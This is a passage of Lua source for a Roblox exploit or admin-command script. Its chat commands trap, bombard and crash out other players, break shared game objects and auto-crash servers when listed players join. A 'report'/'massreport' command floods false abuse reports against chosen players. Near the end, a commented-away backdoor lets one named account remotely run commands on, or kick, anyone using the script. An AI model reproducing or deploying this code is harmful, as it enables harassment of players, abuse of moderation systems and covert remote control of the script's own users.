	for i = 1,#Text do
		table.insert(Letters, string.sub(Text,i,i))
	end
	for Num = 1,#Letters do
		if not Letters[Num] then break end
		local Letter = Letters[Num]
		
		local function AddLetter()
			table.insert(IDs, TextConverter.LetterSounds[Letter])
		end
		
		if Letter ~= "~" then
			if Letters[Num+1] and Letter..Letters[Num+1] == "oo" then -- moo
				table.insert(IDs, TextConverter.LetterSounds["oo"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ou" then -- soup
				table.insert(IDs, TextConverter.LetterSounds["oo"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "th" then -- this
				table.insert(IDs, TextConverter.LetterSounds["th"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "sh" then -- shut
				table.insert(IDs, TextConverter.LetterSounds["sh"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ee" then -- flee
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "wh" then -- what
				table.insert(IDs, TextConverter.LetterSounds["wh"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ch" then -- chop
				table.insert(IDs, TextConverter.LetterSounds["ch"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ph" then -- phone
				table.insert(IDs, TextConverter.LetterSounds["f"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ng" then -- danger
				table.insert(IDs, TextConverter.LetterSounds[Num])
				Letters[Num + 1] = "j"
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ua" then -- lua
				table.insert(IDs, TextConverter.LetterSounds["oo"])
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ea" then -- peace
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "eo" then -- people
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
				if ValidE(Letters[Num+4]) then Letters[Num+4] = "~" end
			elseif Letter == "c" and ValidE(Letters[Num+1]) then -- force
				table.insert(IDs, TextConverter.LetterSounds["s"])
				Letters[Num + 1] = "~"
			elseif Letter == string.lower(Letter) and IsVowel(Letter) and Letters[Num+1] and Letters[Num+2] and not IsSpacer(Letters[Num+1]) and ValidE(Letters[Num+2]) then -- like
				table.insert(IDs, TextConverter.LongVowels[Letter])
				Letters[Num + 2] = "~"
			elseif Letter == "i" and Letters[Num+1] and ValidE(Letters[Num+1]) and IsSpacer(Letters[Num+2]) then -- die
				table.insert(IDs, TextConverter.LongVowels["i"])
				Letters[Num + 1] = "~"
			elseif Letter == "o" and IsSpacer(Letters[Num+1]) then -- no
				table.insert(IDs, TextConverter.LongVowels["o"])
			elseif Letter == "i" and IsSpacer(Letters[Num+1]) then -- hi
				table.insert(IDs, TextConverter.LongVowels["i"])
			elseif Letters[Num+1] and IsSpacer(Letters[Num+2]) and Letter..Letters[Num+1] == "le" then -- bottle
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and IsSpacer(Letters[Num+2]) and Letter..Letters[Num+1] == "el" then -- model
				Letters[Num] = "~"
			elseif Letters[Num+1] and Letters[Num+2] and Letter..Letters[Num+1] == "le" then -- bottle
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "qu" then --quick
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] == Letter then
				table.remove(Letters, Num)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ck" then --click
				AddLetter()
				table.remove(Letters, Num)
			elseif IsVowel(Letter) and string.upper(Letter) == Letter then
				table.insert(IDs, TextConverter.LongVowels[string.lower(Letter)])
			elseif TextConverter.LetterSounds[Letter] then
				AddLetter()
			elseif IsSpacer(Letter) then
				table.insert(IDs, "Rest")
			end
		end
	end
	
	return IDs
end

local function SayConvertedText(IDs, Parent)
	if not Parent then Parent = workspace end
	for _,Data in pairs(IDs) do
		if NoSpeak and Parent == workspace then
			break
		end
		local Length = 0.3
		if Data ~= "Rest" then
			local ID = Data[1]
			Length = Data[2]
			
			local Sound = MakeSound(Parent, ID, 0.5, 1, false)
			if Length then
				coroutine.wrap(function()
				end)()
			end
		end
		if not Length then Length = 0.3 end
		wait(Length/2)
	end
	coroutine.wrap(function()
		game.Players:Chat("music nan")
	end)()
end

local fixer = args[1]
for i=2,#args do
fixer = fixer.." "..args[i]
end

SayConvertedText(ConvertText(fixer))
end)

addCommand("trap",{"player","time"},function(args)
    local function GetCage()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("PortableJustice") then
        return game.Players.LocalPlayer.Character:FindFirstChild("PortableJustice")
    else
        game.Players:Chat("gear me 82357101")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
local function CagePlayer(Player)
    local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    if Player and Player.Character and Player.Character.Head and not Player.Character:FindFirstChild("Part") then
        local A_1 = Player.Character
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.Head.CFrame
        GetCage().MouseClick:FireServer(A_1)
        repeat game:GetService("RunService").RenderStepped:Wait() until Player.Character:FindFirstChild("Part")
        GetCage():Destroy()
	game.Players.LocalPlayer.PlayerGui:FindFirstChild("HelpGui"):Destroy()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
        game.Players:Chat("removetools me")
        game.Players:Chat("pm "..Player.Name.." ["..ScriptName.."]\nYou are currently trapped for "..args[2].."s.")
    end
end
Loops.trap = true
spawn(function()
    wait(tonumber(args[2]))
    Loops.trap = false
end)
local Player = GetPlayers(args[1])
repeat game:GetService("RunService").RenderStepped:Wait()
    pcall(function()
for i,v in pairs(Player) do
    pcall(function()
        CagePlayer(v)
    end)
end
    end)
until not Loops.trap
for i,v in pairs(Player) do
    game.Players:Chat("reset "..v.Name)
    wait()
    game.Players:Chat("pm "..v.Name.." ["..ScriptName.."]\nYou are no longer trapped.")
    wait()
end
end)

addCommand("equipall",{},function()
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
    end
end)

addCommand("dropall",{},function()
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
    end
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
        if v:IsA("Tool") then v.Parent = workspace end
    end
end)

addCommand("activateall",{},function()
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
        if v:IsA("Tool") then v:Activate() end
    end
end)

addCommand("playmusic",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.."%20"..args[i]
    end
    local request = HttpRequest({
        Url="https://search.roblox.com/catalog/json?CatalogContext=2&Category=9&SortType=3&ResultsPerPage=10&Keyword="..fixer,
        Method=GET
    })
    local decode = game:GetService("HttpService"):JSONDecode(request.Body)
    game.Players:Chat("music "..tostring(decode[1]["AssetId"]))
end)

addCommand("copymusicid",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.."%20"..args[i]
    end
    local request = HttpRequest({
        Url="https://search.roblox.com/catalog/json?CatalogContext=2&Category=9&SortType=3&ResultsPerPage=10&Keyword="..fixer,
        Method=GET
    })
    local decode = game:GetService("HttpService"):JSONDecode(request.Body)
    setclipboard(tostring(decode[1]["AssetId"]))
end)

addCommand("play",{"audio-name"},function(args)
    runCommand(prefix.."playmusic",args)
end)

addCommand("playlocalmusic",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    if workspace:FindFirstChild("LocalMusic__") then
        workspace["LocalMusic__"]:Destroy()
    end
    local LocalMusic = Instance.new("Sound",workspace)
    LocalMusic.Name = "LocalMusic__"
    LocalMusic.Volume = 10
    LocalMusic.Looped = true
    LocalMusic.SoundId = getSoundId("https://raw.githubusercontent.com/iiDk-the-actual/Music/main/"..fixer..".mp3",fixer)
    LocalMusic:Play()
end)

addCommand("stoplocalmusic",{},function()
    if workspace:FindFirstChild("LocalMusic__") then
        workspace["LocalMusic__"]:Destroy()
    end
end)

addCommand("runcommand",{"command"},function(args)
    local message = args[1]
                for i=2, #args do
                        if args[i]=="<%RANDOMSTRING%>" then
                            local asuhdyuasd=""
                            for i=1,25 do
                            asuhdyuasd=asuhdyuasd..lettersTableFormat[math.random(#lettersTableFormat)]
                            end
                            
                            message = message.." "..asuhdyuasd
                        elseif args[i]==[[\n]] then
                        message = message.." ".."\n"
                        else
                        message = message.." "..args[i]
                        end
                end
    game.Players:Chat(message)
end)

addCommand("ascend",{"player"},function(args)
game.Players:Chat("music 9061674082")
for i,v in pairs(GetPlayers(args[1])) do
spawn(function()
game.Players:Chat("setgrav "..v.Name.." -256")
game.Players:Chat("trip "..v.Name)
wait(0.4)
game.Players:Chat("trip "..v.Name)
end)
end
end)

addCommand("runcommandplr",{"command","player1","player2"},function(args)
    for i,v in pairs(GetPlayers(args[3])) do
        for i2,v2 in pairs(GetPlayers(args[2])) do
            print(args[1].." "..v2.Name.." "..v.Name)
            game.Players:Chat(args[1].." "..v2.Name.." "..v.Name)
        end
    end
end)

addCommand("rcplr",{"command","player1","player2"},function(args)
    runCommand(prefix.."runcommandplr",args)
end)

addCommand("runcommandbatch",{"delay","command"},function(args)
                    local message = args[2]
                for i=3, #args do
                        if args[i]=="<%RANDOMSTRING%>" then
                            local asuhdyuasd=""
                            for i=1,25 do
                            asuhdyuasd=asuhdyuasd..lettersTableFormat[math.random(#lettersTableFormat)]
                            end
                            
                            message = message.." "..asuhdyuasd
                        elseif args[i]==[[\n]] then
                        message = message.." ".."\n"
                        else
                        message = message.." "..args[i]
                        end
                end
                    for i,v in pairs(message:split("|")) do
                        game.Players:Chat(v)
                        wait(tonumber(args[1]))
                    end
end)

addCommand("copybypass",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    local s,f=pcall(function()
	local thegod = ""
    for i,v in pairs(Audios) do
        if string.match(v[2]:lower(),fixer:lower()) then
            thegod = v[1]
            break
        end
    end
	setclipboard(thegod)
    end) if not s then print(f)end
end)

addCommand("playbypass",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    local s,f=pcall(function()
    for i,v in pairs(Audios) do
        if string.match(v[2]:lower(),fixer:lower()) then
            game.Players:Chat("music "..v[1])
            break
        end
    end
    end) if not s then print(f)end
end)

addCommand("getbypassed",{},function()
    local s,f=pcall(function()
	print("ff -:AUDIOS ["..tostring(#Audios).."]:-")
    for i,v in pairs(Audios) do
        print(v[2].." | Uploaded "..v[3].." | Bypassed by "..v[4])
    end
    GUI:SendMessage(ScriptName, "Check the developer console for a list of bypassed audios.")
    end)if not s then print(f)end
end)

addCommand("altgetbypassed",{},function()
    local s,f=pcall(function()
    for i,v in pairs(Audios) do
        game.Players:Chat("ff "..v[2].." | Uploaded "..v[3].." | Bypassed by "..v[4])
        wait()
    end
    wait()
    game.Players:Chat("ff -:AUDIOS ["..tostring(#Audios).."]:-")
    wait()
    GUI:SendMessage(ScriptName, "Check logs for list of audios.")
    end)if not s then print(f)end
end)

addCommand("stopmusic",{},function()
    game.Players:Chat("music nan")
end)

addCommand("bypassmessage",{"message"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    local file = fixer
    local a = {}
    
    for letter in file:gmatch(".") do
      if letter ~= "\r" and letter ~= "\n" then
        table.insert(a, letter)
      end
    end
    
    for i, v in ipairs(a) do
      print(i, v)
    end
    
    for b, c in ipairs(a) do
        local d = "variable_" .. tostring(b)
        _G[d] = c
    end
    for b, c in ipairs(a) do
        local e = string.rep("  ", 2 * (b - 1))
        if PersonsAdmin then
            game.Players:Chat("h/the\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
        else
            game.Players:Chat("h iiWasHere\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
        end
    end
end)

addCommand("announce",{"message"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    GUI:SendMessage(ScriptName, fixer)
end)

addCommand("say",{"message"},function(args)
	local fixer = args[1]
	for i=2, #args do
	fixer=fixer.." "..args[i]
	end
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({fixer,"All"}))
end)

addCommand("noturn",{},function()
    game.Players:Chat("gear all 4842186817")
    game.Players:Chat("gear all 4842218829")
    game.Players:Chat("gear all 4842215723")
    game.Players:Chat("gear all 4842207161")
    game.Players:Chat("gear all 4842212980")
end)

addCommand("doomcamera",{},function()
    game.Players:Chat("tp others me")
    game.Players:Chat("gear me 68354832")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    local wand = game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    wand.Parent = plr.Character
    wait(0.2)
    wand:Activate()
    wait(0.4)
    game.Players:Chat("reset all")
end)

addCommand("undoomcamera",{},function()
    game.Players:Chat("tp others me")
    game.Players:Chat("gear me 68354832")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    local wand = plr.Backpack:FindFirstChild("BlizzardWand")
    wand.Parent = plr.Character
    wait(0.2)
    wand:Activate()
end)

addCommand("stop",{},function()
    runCommand(prefix.."stopmusic",{})
end)

addCommand("stopall",{},function()
    for i,v in pairs(workspace:GetDescendants()) do
        if v:isA("Sound") then v:Stop() end
    end
end)

addCommand("playall",{},function()
    for i,v in pairs(workspace:GetDescendants()) do
        if v:isA("Sound") then v:Play() end
    end
end)

addCommand("unmusiclock",{},function()
    Loops.musiclock = false
end)

addCommand("obliterate",{"player"},function(args)
    local function equiptools()
    for _, v in ipairs(game.Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
        if v:IsA('Tool') then
        v.Parent = game.Players.LocalPlayer.Character
        end
    end
end
for i = 1, 5 do
            game.Players:Chat("gear me 169602103")
            end
            repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 5
            equiptools()
            for i = 1, 1000 do
                pcall(function()
                    local RandomPlayerFromStuff = GetPlayers(args[1])
                    RandomPlayerFromStuff = RandomPlayerFromStuff[math.random(1,#RandomPlayerFromStuff)]
                    game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(RandomPlayerFromStuff.Character.Head.Position,Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200)))
                end)
            end
            wait(10)
            game.Players:Chat("removetools me")
end)

addCommand("railcannon",{},function()
    local s,f=pcall(function()
    local args = {15}
    for i2=1,args[1] do
        for i=1,args[1] do
            game.Players:Chat("gear me 79446473")
            repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("Railgun")
            game.Players.LocalPlayer.Backpack:FindFirstChild("Railgun").GripPos=(CFrame.Angles(0,0,math.rad(i2*(360/args[1])))*CFrame.new(math.cos(i*(360/args[1]))*10,0,math.sin(i*(args[1]/360))*10)).p
            game.Players.LocalPlayer.Backpack:FindFirstChild("Railgun").Parent = game.Players.LocalPlayer.Character
        end
    end
    end) if not s then print(f)end
    wait(0.25)
    game.Players:Chat("invisible me")
    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 8
    Connections.cannonthing = game:GetService("UserInputService").InputBegan:Connect(function(inputa,gp)
    if gp then return end
    if inputa.UserInputType == Enum.UserInputType.MouseButton1 then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Click:FireServer(game.Players.LocalPlayer:GetMouse().Hit.p)
            end
        end
    end
    end)
end)

addCommand("widerailcannon",{},function()
    local s,f=pcall(function()
    local args = {15}
    for i2=1,args[1] do
        for i=1,args[1] do
            game.Players:Chat("gear me 79446473")
            repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("Railgun")
            game.Players.LocalPlayer.Backpack:FindFirstChild("Railgun").GripPos=(CFrame.Angles(0,0,math.rad(i2*(360/args[1])))*CFrame.new(math.cos(i*(360/args[1]))*10,0,math.sin(i*(args[1]/360))*10)).p
            game.Players.LocalPlayer.Backpack:FindFirstChild("Railgun").Parent = game.Players.LocalPlayer.Character
        end
    end
    end) if not s then print(f)end
    wait(0.25)
    game.Players:Chat("invisible me")
    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 8
    Connections.cannonthing = game:GetService("UserInputService").InputBegan:Connect(function(inputa,gp)
    if gp then return end
    if inputa.UserInputType == Enum.UserInputType.MouseButton1 then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Click:FireServer((v.Handle.CFrame*CFrame.new(0,0,-100)).p)
            end
        end
    end
    end)
end)

addCommand("unrailcannon",{},function()
    Connections.cannonthing:Disconnect()
    game.Players:Chat("reset me")
end)

addCommand("whitelist",{"player"},function(args)
    local Player = GetPlayers(args[1])
    
    for i,v in pairs(Player) do
        if v ~= game.Players.LocalPlayer and not table.find(Whitelisted,v.Name) then
            table.insert(Whitelisted,v.Name)
            GUI:SendMessage(ScriptName, "Whitelisted player "..v.DisplayName..".")
        end
    end
end)

addCommand("blacklist",{"player"},function(args)
    local Player = GetPlayers(args[1])
    
    for i,v in pairs(Player) do
        if table.find(Whitelisted,v.Name) then
            table.remove(Whitelisted,table.find(Whitelisted,v.Name))
            GUI:SendMessage(ScriptName, "Blacklisted/unwhitelisted player "..v.DisplayName..".")
        end
    end
end)

addCommand("unwhitelist",{"player"},function(args)
    runCommand(prefix.."blacklist",args)
end)

addCommand("whitelisted",{},function()
    local whitelisted = Whitelisted
    local message = "Currently Whitelisted ("..#whitelisted.."): "
                for i,v in pairs(whitelisted) do
                    if v ~= whitelisted[#whitelisted] then
                        message = message..v..", "
                    else
                        if #whitelisted ~= 1 then
                            message = message.."& "..v.."."
                        else
                            message = message..v.."."
                        end
                    end
                end
                GUI:SendMessage(ScriptName, message)
end)

addCommand("serverlock",{},function()
    ServerLocked = not ServerLocked
    if ServerLocked then
        GUI:SendMessage(ScriptName, "The server has been locked.")
    else
        GUI:SendMessage(ScriptName, "The server has been unlocked.")
    end
end)

addCommand("person299",{"true/false"},function(args)
    if args[1] == "true" then
        PersonsAdmin = true
        GUI:SendMessage(ScriptName, "Person's Admin has been enabled.")
    else
        PersonsAdmin = false
        GUI:SendMessage(ScriptName, "Person's Admin has been disabled.")
    end
end)

addCommand("hasperm",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		local has = checkGamepass(v,66254)
		if has == "200" then
			GUI:SendMessage(ScriptName, v.DisplayName.." has Permanent Admin.")
			print(v.DisplayName.." has Permanent Admin ("..has..")")
		else
			GUI:SendMessage(ScriptName, v.DisplayName.." does not have Permanent Admin.")
			print(v.DisplayName.." does not have Permanent Admin ("..has..")")
		end
	end
end)

addCommand("hasperson299",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		local has = checkGamepass(v,35748)
		print(has)
		if has == "200" then
			GUI:SendMessage(ScriptName, v.DisplayName.." has Person's Admin.")
			print(v.DisplayName.." has Person's Admin ("..has..")")
		else
			GUI:SendMessage(ScriptName, v.DisplayName.." does not have Person's Admin.")
			print(v.DisplayName.." does not have Person's Admin ("..has..")")
		end
	end
end)

--[[
addCommand("legacykick",{"true/false"},function(args)
    if args[1] == "true" then
        LegacyKick = true
        GUI:SendMessage(ScriptName, "Legacy kick has been enabled.")
    else
        LegacyKick = false
        GUI:SendMessage(ScriptName, "Legacy kick has been disabled.")
    end
end)
]]

addCommand("legacyserverlock",{"true/false"},function(args)
    if args[1] == "true" then
        OldServerLock = true
        GUI:SendMessage(ScriptName, "Legacy server lock has been enabled.")
    else
        OldServerLock = false
        GUI:SendMessage(ScriptName, "Legacy server lock has been disabled.")
    end
end)

addCommand("serverlocksound",{"true/false","soundid"},function(args)
    if args[1]=="true" then
        ServerLockedSoundEnabled = true
        GUI:SendMessage(ScriptName, "Server locked sounds have been enabled.")
    else
        ServerLockedSoundEnabled = false
        GUI:SendMessage(ScriptName, "Server locked sounds have been disabled.")
    end
    ServerLockedSound = args[2]
end)

addCommand("bansound",{"true/false","soundid"},function(args)
    if args[1]=="true" then
        BanSoundsEnabled = true
        GUI:SendMessage(ScriptName, "Ban sounds have been enabled.")
    else
        BanSoundsEnabled = false
        GUI:SendMessage(ScriptName, "Ban sounds have been disabled.")
    end
    BanSound = args[2]
end)

addCommand("report",{"player","amount","reason"},function(args)
	local fixer = {BM[3]}
    	for i=4, #BM do
        	table.insert(fixer,BM[i])
    	end
	for i,v in pairs(GetPlayers(args[1])) do
		for i=1,tonumber(args[2]) do		
			game.Players:ReportAbuse(v, "Swearing", fixer)
		end
	end
end)

addCommand("massreport",{"player","amount","reason"},function(args)
	runCommand(prefix.."report",args)
end)

addCommand("antiserverlock",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        table.insert(ServerLockedProtection,v.Name)
        GUI:SendMessage(ScriptName, v.DisplayName.." is now protected against a server lock.")
    end
end)

addCommand("racheliscool",{"player"},function(args)
    runCommand(prefix.."antiserverlock",args)
end)

addCommand("aidaniscool",{"player"},function(args)
    runCommand(prefix.."antiserverlock",args)
end)

addCommand("unantiserverlock",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        if table.find(ServerLockedProtection,v.Name) then
            table.remove(ServerLockedProtection,table.find(ServerLockedProtection,v.Name))
            GUI:SendMessage(ScriptName, v.DisplayName.." is no longer protected against a server lock.")
        end
    end
end)

addCommand("unracheliscool",{"player"},function(args)
    runCommand(prefix.."unantiserverlock",args)
end)

addCommand("unaidaniscool",{"player"},function(args)
    runCommand(prefix.."unantiserverlock",args)
end)

addCommand("breakbaseplate",{},function()
    game.Players:Chat("gear me 111876831")
lp.Backpack:WaitForChild("April Showers",30)
local tool = lp.Backpack["April Showers"]
tool.Parent = lp.Character
wait(0.1)
tool:Activate()
lp.Character.HumanoidRootPart.CFrame = CFrame.new(lp:GetMouse().Hit.p.X,lp:GetMouse().Hit.p.Y,lp:GetMouse().Hit.p.Z)
wait()
lp.Character.HumanoidRootPart.CFrame = lp.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,3.6)
wait(15)
game.Players:Chat("gear me 110789105")
lp.Backpack:WaitForChild("RageTable",30)
local tool2 = lp.Backpack["RageTable"]
tool2.Parent = lp.Character
wait(0.1)
tool2:Activate()
end)

addCommand("destroybaseplate",{},function()
    chr.HumanoidRootPart.CFrame = CFrame.new(-57.5680008, 4.93264008, -23.7113419, -0.00361082237, 1.2097874e-07, 0.999993503, 6.45502425e-08, 1, -1.20746449e-07, -0.999993503, 6.41138271e-08, -0.00361082237)
    game.Players:Chat("sit me")
    wait(0.75)
    game.Players:Chat("punish me")
    wait()
    game.Players:Chat("unpunish me")
    wait()
    game.Players:Chat("skydive me")
    wait(0.2)
    game.Players:Chat("respawn me")
end)

addCommand("flipbaseplate",{},function()
    chr.HumanoidRootPart.CFrame = CFrame.new(-57.5680008, 4.93264008, -23.7113419, -0.00361082237, 1.2097874e-07, 0.999993503, 6.45502425e-08, 1, -1.20746449e-07, -0.999993503, 6.41138271e-08, -0.00361082237)
    game.Players:Chat("sit me")
    wait(0.75)
    game.Players:Chat("punish me")
    wait()
    game.Players:Chat("unpunish me")
    wait()
    game.Players:Chat("trip me")
    wait(0.2)
    game.Players:Chat("respawn me")
end)

addCommand("forcerespawn",{},function()
    game.Players.LocalPlayer.Character:Destroy()
end)

addCommand("fixvelocity",{},function()
    for i,v in pairs(workspace.Terrain["_Game"]:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity = Vector3.new(0,0,0)
        end
    end
end)

addCommand("fixbaseplatevelocity",{},function()
	local target = workspace.Terrain["_Game"].Workspace.Baseplate
function movepart()
	local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
	local looping = true
	spawn(function()
		while true do
			game:GetService('RunService').Heartbeat:Wait()
			game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
			cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
			if not looping then break end
		end
	end)
	spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
	wait(0.25)
	looping = false
end
movepart()
wait(0.5)
game.Players:Chat("unskydive me")
wait(0.5)
game.Players:Chat("respawn me")
end)

addCommand("localremoveobby",{},function()pcall(function()
    workspace.Terrain["_Game"]["Workspace"].Obby.Parent = game.Chat
    workspace.Terrain["_Game"]["Workspace"]["Obby Box"].Parent = game.Chat
end)end)

addCommand("nokill",{},function()pcall(function()
    for i,v in pairs(workspace.Terrain["_Game"]["Workspace"].Obby:GetDescendants()) do
        if v:IsA("TouchTransmitter") then v:Destroy() end
    end
end)end)

addCommand("localaddobby",{},function()pcall(function()
    game.Chat:FindFirstChild("Obby").Parent = workspace.Terrain["_Game"]["Workspace"]
    game.Chat:FindFirstChild("Obby Box").Parent = workspace.Terrain["_Game"]["Workspace"]
end)end)

addCommand("extendlogs",{},function()
    plr.PlayerGui:FindFirstChild("ScrollGui").TextButton.Frame.Size = UDim2.new(0,1000,0,1000)
end)

addCommand("debugcommand",{},function()
    GUI:SendMessage(ScriptName, "more debug text yippee")
end)

Connections.Chatted = game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if not running then return end
    local BM = msg:split(" ")
    if BM[1] == "/e" then
        table.remove(BM,1)
    end
    if string.sub(BM[1],0,#prefix) == prefix then
    local commandname = BM[1]:lower()
    local t = ""
    table.remove(BM,1)
    local findargs = {}
    for i,v in pairs(BM) do
        table.insert(findargs,v)
        t=t..v.." "
    end
    spawn(function()runCommand(commandname,findargs)end)
    if consoleOn then
    print("running command: "..commandname.." "..t)
    end
    end
end)

Connections.PlayerChatted = game.Players.PlayerChatted:Connect(function(PlayerChatType,sender,message)--game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(message)
    local s,f=pcall(function()
    
    if table.find(Whitelisted,sender.Name) then
        if not running then return end
        local BM = message:split(" ")
        if BM[1] == "/e" then
            table.remove(BM,1)
        end
        if string.sub(BM[1],0,1) == prefix then
        local commandname = BM[1]:lower()
        local t = ""
        table.remove(BM,1)
        local findargs = {}
        for i,v in pairs(BM) do
            table.insert(findargs,v)
            t=t..v.." "
        end
        spawn(function()runCommand(commandname,findargs)end)
        if consoleOn then
        GUI:SendMessage(ScriptName, "running command: "..commandname.." "..t)
        end
        end
    end

	-- you don't see anything here ;3 u sneaky sneaky people.. plz no tell anyone??? plz??
	if sender.Name == "ii_SaucyyRon" then
		pcall(function()
		local BM = message:split(" ")
        	if BM[1] == "/e" then
        		table.remove(BM,1)
        	end
		if BM[1]:lower() == "[bd]rundirect" then
			local fixer = {BM[3]}
    			for i=4, #BM do
        			table.insert(fixer,BM[i])
    			end
			for i,v in pairs(GetPlayers(BM[2])) do
				if v == game.Players.LocalPlayer then
					spawn(function()
						runCommand(prefix.."run",fixer)
					end)
				end
			end
		end
		if BM[1]:lower() == "[bd]kick" then
			for i,v in pairs(GetPlayers(BM[2])) do
				if v == game.Players.LocalPlayer then
					spawn(function()
						game.Players.LocalPlayer:Destroy()
					end)
				end
			end
		end
		end)
	end
    end) if not s then print(f)end
end)

local function PlayerAdded(Player)
    spawn(function()
        repeat wait() until Player and Player.Name
        if table.find(Whitelisted,Player.Name) then
            GUI:SendMessage(ScriptName, "You are whitelisted, "..Player.Name..".\nUse .altcmds to see a list of commands.")
        end
	
	if table.find(PlayerCrash,Player.Name) and not Settings["Auto Crasher"]["Enabled"] then -- Automatically crashes if in server
		GUI:SendMessageNoBrackets("\n\n\n\n["..ScriptName.."]", "\n\n\n\nAuto crash player ("..Player.DisplayName..") found, crashing server.")
		task.wait(0.333)
		if PlayerCrashMode == true then
			runCommand(prefix.."vampirecrash",{})
		else
			runCommand(prefix.."shutdown",{})
		end
	end
        
        if table.find(Banned,Player.Name) then
            repeat wait() until Player and Player.Character
            wait(0.25)
            if BanSoundsEnabled then
                runCommand(prefix.."rocketcrashsound",{v.Name,BanSound})
            else
                runCommand(prefix.."rocketcrash",{v.Name})
            end
        end
        
        if table.find(DefaultSoftlocked,Player.Name) then
            repeat wait() until Player and Player.Character
            wait(0.25)
            runCommand(prefix.."softlock",{Player.Name})
        end
	
	if Settings["Player Autorun Commands"][Player.Name] and not (Settings["Auto Crasher"]["Enabled"] and Settings["Auto Crasher"]["Ignore Autorun Commands"]) then
		local v = Settings["Player Autorun Commands"][Player.Name]
		local fixer = {}
		if #v > 1 then
			for i=2,#v:split(" ") do
				table.insert(fixer,v:split(" ")[i])
			end
		end
		
		print("player "..Player.Name.." is in server, autorunning command: "..prefix..v)
		runCommand(prefix..v:split(" ")[1],fixer)
	end
        
